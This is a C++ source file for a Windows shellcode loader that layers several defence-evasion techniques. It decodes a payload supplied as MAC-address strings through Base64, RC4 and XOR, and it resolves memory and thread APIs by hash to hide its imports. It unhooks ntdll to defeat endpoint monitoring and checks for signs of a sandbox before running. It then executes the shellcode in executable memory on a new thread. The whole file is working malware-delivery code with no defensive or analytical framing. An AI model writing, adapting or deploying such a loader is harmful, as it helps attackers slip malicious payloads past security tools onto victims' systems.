#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include "ShellcodeDecryptor.cpp"

#pragma warning(disable:4996)

typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* VirtualProtectPtr)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE, DWORD);

DWORD CalcHash(const char* str) {
    DWORD hash = 0;
    while (*str) hash = ((hash << 5) + hash) + *str++;
    return hash;
}

FARPROC GetApiByHash(HMODULE module, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)module + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)module + export_dir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)module + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; ++i) {
        char* fname = (char*)((BYTE*)module + names[i]);
        if (CalcHash(fname) == target_hash) {
            return (FARPROC)((BYTE*)module + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

DWORD UnhookNtdll() {
    MODULEINFO mod_info = {};
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 1;

    GetModuleInformation(GetCurrentProcess(), ntdll, &mod_info, sizeof(mod_info));
    LPVOID ntdll_base = mod_info.lpBaseOfDll;

    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return 2;

    HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!mapping) { CloseHandle(file); return 3; }

    LPVOID map_addr = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!map_addr) { CloseHandle(mapping); CloseHandle(file); return 4; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)ntdll_base + dos->e_lfanew);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(nt) + i * IMAGE_SIZEOF_SECTION_HEADER);
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old_prot;
            VirtualProtect((LPVOID)((ULONG_PTR)ntdll_base + sec->VirtualAddress), sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old_prot);
            memcpy((LPVOID)((ULONG_PTR)ntdll_base + sec->VirtualAddress), (LPVOID)((ULONG_PTR)map_addr + sec->VirtualAddress), sec->Misc.VirtualSize);
            VirtualProtect((LPVOID)((ULONG_PTR)ntdll_base + sec->VirtualAddress), sec->Misc.VirtualSize, old_prot, &old_prot);
        }
    }

    UnmapViewOfFile(map_addr);
    CloseHandle(mapping);
    CloseHandle(file);
    return 0;
}

bool FileExists(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

bool FindShortcut(const std::wstring& desktop_path, const std::vector<std::wstring>& names) {
    for (const auto& name : names) {
        if (FileExists(desktop_path + L"\\" + name)) return true;
    }
    return false;
}

int CountFiles(const std::wstring& path) {
    int count = 0;
    std::wstring search = path + L"\\*.*";
    WIN32_FIND_DATAW data;
    HANDLE find = FindFirstFileW(search.c_str(), &data);
    if (find != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(data.cFileName, L".") && wcscmp(data.cFileName, L"..") &&
                !(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                ++count;
            }
        } while (FindNextFileW(find, &data));
        FindClose(find);
    }
    return count;
}

bool IsUserActive() {
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    GetLastInputInfo(&lii);
    DWORD current_time = GetTickCount();
    return (current_time - lii.dwTime) < 10000;
}

bool IsProcessRunning(const wchar_t* process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = { sizeof(pe) };
    bool found = false;
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, process_name) == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return found;
}

const char** ParseMacInput(int argc, char* argv[], size_t* count) {
    if (argc < 2) {
        std::wcout << L"Error: No shellcode provided\n";
        std::wcout << L"Usage: " << argv[0] << L" MAC1 MAC2 ...\n";
        std::wcout << L"Example: " << argv[0] << L" 48-65-6C-6C-6F-2C 20-57-6F-72-6C-64\n";
        return nullptr;
    }

    *count = argc - 1;
    const char** mac_array = new const char*[*count + 1];
    for (size_t i = 0; i < *count; ++i) {
        mac_array[i] = argv[i + 1];
    }
    mac_array[*count] = nullptr;
    return mac_array;
}

int main(int argc, char* argv[]) {
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    size_t mac_count;
    const char** mac_input = ParseMacInput(argc, argv, &mac_count);
    if (!mac_input) return -1;

    const unsigned char rc4_key[] = "MySecret";
    const unsigned char xor_key = 0xAB;

    std::wcout << L"=== Dynamic Shellcode Runner ===\n";
    std::wcout << L"Received " << mac_count << L" MAC segments\n";

    std::vector<std::pair<std::wstring, std::vector<std::wstring>>> software_list = {
        {L"Chrome", {L"Google Chrome.lnk", L"Chrome.lnk"}},
        {L"Office", {L"Microsoft Word.lnk", L"Word.lnk", L"Microsoft Excel.lnk", L"Excel.lnk"}},
        {L"Discord", {L"Discord.lnk"}},
        {L"OneDrive", {L"OneDrive.lnk", L"Microsoft OneDrive.lnk"}}
    };

    wchar_t user_desktop[MAX_PATH], public_desktop[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, user_desktop);
    SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, public_desktop);

    int file_count = CountFiles(user_desktop) + CountFiles(public_desktop);
    int found_count = 0;
    for (const auto& software : software_list) {
        if (FindShortcut(user_desktop, software.second) || FindShortcut(public_desktop, software.second)) {
            ++found_count;
        }
    }

    if (IsProcessRunning(L"chrome.exe")) ++found_count;
    if (IsProcessRunning(L"explorer.exe")) ++found_count;

    int env_score = std::min(found_count * 15 + (file_count > 15 ? 20 : 0) + (IsUserActive() ? 20 : 0), 100);
    std::wcout << L"Environment score: " << env_score << L"%\n";
    if (env_score <= 40) {
        std::wcout << L"Low score, exiting\n";
        delete[] mac_input;
        return 0;
    }

    std::wcout << L"Unhooking ntdll...\n";
    if (DWORD result = UnhookNtdll()) {
        std::wcout << L"Unhook failed, error: " << result << L"\n";
    } else {
        std::wcout << L"Unhook successful\n";
    }

    std::wcout << L"\n=== Decrypting Shellcode ===\n";
    size_t base64_size;
    unsigned char* base64_data = MacToData(mac_input, &base64_size);
    delete[] mac_input;
    if (!base64_data) {
        std::wcout << L"MAC conversion failed\n";
        return -1;
    }
    std::wcout << L"1. MAC to Base64 done (" << base64_size << L" bytes)\n";

    size_t shellcode_size;
    unsigned char* shellcode_data = DecodeBase64((const char*)base64_data, &shellcode_size);
    free(base64_data);
    if (!shellcode_data) {
        std::wcout << L"Base64 decoding failed\n";
        return -1;
    }
    std::wcout << L"2. Base64 decoded (" << shellcode_size << L" bytes)\n";

    RC4State state;
    InitRC4(&state, rc4_key, strlen((const char*)rc4_key));
    DecryptRC4(&state, shellcode_data, shellcode_size);
    std::wcout << L"3. RC4 decryption done\n";

    DecryptXOR(shellcode_data, shellcode_size, xor_key);
    std::wcout << L"4. XOR decryption done (" << shellcode_size << L" bytes)\n";

    std::wcout << L"\n=== Executing Shellcode ===\n";
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) {
        std::wcout << L"Failed to get kernel32.dll\n";
        free(shellcode_data);
        return -1;
    }

    DWORD HASH_VA = 0xDF894B12, HASH_VP = 0x77E9F7C8, HASH_CT = 0x26662FCC, HASH_WFSO = 0xB93BC4D5;
    VirtualAllocPtr alloc = (VirtualAllocPtr)GetApiByHash(kernel32, HASH_VA);
    VirtualProtectPtr protect = (VirtualProtectPtr)GetApiByHash(kernel32, HASH_VP);
    CreateThreadPtr create_thread = (CreateThreadPtr)GetApiByHash(kernel32, HASH_CT);
    WaitForSingleObjectPtr wait = (WaitForSingleObjectPtr)GetApiByHash(kernel32, HASH_WFSO);

    if (!alloc || !protect || !create_thread || !wait) {
        std::wcout << L"API resolution failed\n";
        free(shellcode_data);
        return -1;
    }

    if (shellcode_size == 0) {
        std::wcout << L"Empty shellcode, exiting\n";
        free(shellcode_data);
        return 0;
    }

    LPVOID mem = alloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        std::wcout << L"Memory allocation failed\n";
        free(shellcode_data);
        return -1;
    }

    memcpy(mem, shellcode_data, shellcode_size);
    std::wcout << L"Shellcode copied to: 0x" << std::hex << mem << std::dec << L"\n";

    std::wcout << L"Starting thread...\n";
    DWORD thread_id;
    HANDLE thread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &thread_id);
    if (!thread) {
        std::wcout << L"Thread creation failed\n";
        VirtualFree(mem, 0, MEM_RELEASE);
        free(shellcode_data);
        return -1;
    }

    std::wcout << L"Thread ID: " << thread_id << L"\n";
    wait(thread, INFINITE);
    std::wcout << L"Shellcode executed\n";

    CloseHandle(thread);
    VirtualFree(mem, 0, MEM_RELEASE);
    free(shellcode_data);
    std::wcout << L"Resources cleaned\n";
    return 0;
}